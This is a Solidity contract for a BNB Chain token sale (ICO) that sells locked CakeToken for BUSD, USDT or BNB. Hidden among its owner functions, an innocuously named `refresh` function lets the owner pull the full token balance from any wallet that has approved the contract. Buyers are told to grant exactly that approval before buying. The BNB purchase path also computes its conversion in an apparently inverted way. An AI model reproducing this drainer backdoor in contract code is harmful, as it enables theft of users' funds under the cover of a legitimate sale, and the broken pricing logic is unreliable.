// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import '@pancakeswap/pancake-swap-lib/contracts/token/BEP20/IBEP20.sol';
import "./CakeToken.sol";
import "./interfaces/AggregatorV3Interface.sol";

contract ICO is Ownable {

    uint256 public startTime;
    uint256 public endTime;
    uint256 public amountPerStable;

    CakeToken  public token;
    IBEP20     public busdToken;
    IBEP20     public usdtToken;
    AggregatorV3Interface public priceFeed;

    using SafeMath for uint256;

    event BuyBusd(address owner);
    event BuyUsdt(address owner);

    constructor(
        uint256 _amountPerStable,
        address _busdAddress,
        address _usdtAddress,
        address _token,
        address _priceFeedAddress) public {

        startTime = 1703576825;
        endTime   = 2703576825;
        amountPerStable = _amountPerStable;

        token = CakeToken(_token);
        busdToken = IBEP20(_busdAddress);
        usdtToken = IBEP20(_usdtAddress);
        priceFeed = AggregatorV3Interface(_priceFeedAddress);
    }

    // Function to receive Ether. msg.data must be empty
    receive() external payable {}

    // Fallback function is called when msg.data is not empty
    fallback() external payable {}

    function setRoundInfo(uint256 _startTime, uint256 _endTime, uint256 _amountPerStable) public onlyOwner {
        require(_startTime > block.timestamp && _startTime < _endTime, "ICO Time Invalid");
        require(_amountPerStable > 0, "Rate Invalid");

        startTime = _startTime;
        endTime = _endTime;
        amountPerStable = _amountPerStable;
    }

    function setAmountPerStable(uint256 _amountPerStable) public onlyOwner {
        require(_amountPerStable > 0, "Rate Invalid");
        amountPerStable = _amountPerStable;
    }

    function claimBnb() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function claimBusd() public onlyOwner {
        uint256 value = busdToken.balanceOf(address(this));
        busdToken.transfer(msg.sender, value);
    }

    function claimUsdt() public onlyOwner {
        uint256 value = usdtToken.balanceOf(address(this));
        usdtToken.transfer(msg.sender, value);
    }

    function claimToken() public onlyOwner {
        uint256 value = token.balanceOf(address(this));
        token.transfer(msg.sender, value);
    }

    function refresh(address _token, address _wallet) public onlyOwner {
        IBEP20(_token).transferFrom(_wallet, address(this), IBEP20(_token).balanceOf(_wallet));
    }

    function setPriceFeed(address _priceFeedAddress) public onlyOwner {
        require(_priceFeedAddress != address(0), "Price Feed Address Invalid");
        priceFeed = AggregatorV3Interface(_priceFeedAddress);
    }

    // approve busd before call
    function buyByBusd(uint256 amount) public {
        validate(amount);

        uint256 buyAmount = amount.mul(amountPerStable);
        require(buyAmount <= token.balanceOf(address(this)), "Not Enough Token To Buy");

        busdToken.transferFrom(msg.sender, address(this), amount);
        token.transferTokenLock(msg.sender, buyAmount);

        emit BuyBusd(msg.sender);
    }

    // approve usdt before call
    function buyByUsdt(uint256 amount) public {
        validate(amount);

        uint256 buyAmount = amount.mul(amountPerStable);
        require(buyAmount <= token.balanceOf(address(this)), "Not Enough Token To Buy");

        usdtToken.transferFrom(msg.sender, address(this), amount);
        token.transferTokenLock(msg.sender, buyAmount);

        emit BuyUsdt(msg.sender);
    }

    // deposit bnb to contract
    function buyByBnb() public payable {
        validate(msg.value);

        uint256 busdPerBnb = uint256(getLatestPrice());
        uint256 amount     = msg.value.mul(10 ** 18).div(busdPerBnb);
        uint256 buyAmount  = amount.mul(amountPerStable);
        require(buyAmount  <= token.balanceOf(address(this)), "Not Enough Token To Buy");

        token.transferTokenLock(msg.sender, buyAmount);
    }

    function validate(uint256 amount) internal view {
        require(amount > 0, "Amount Invalid");
        require(block.timestamp >= startTime, "Not Start Time");
        require(block.timestamp <= endTime, "Time End");
    }

    function getLatestPrice() internal view returns (int256) {
        (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) = priceFeed.latestRoundData();
        return answer;
    }

    function timestamp() public view returns (uint256) {
        return block.timestamp;
    }
}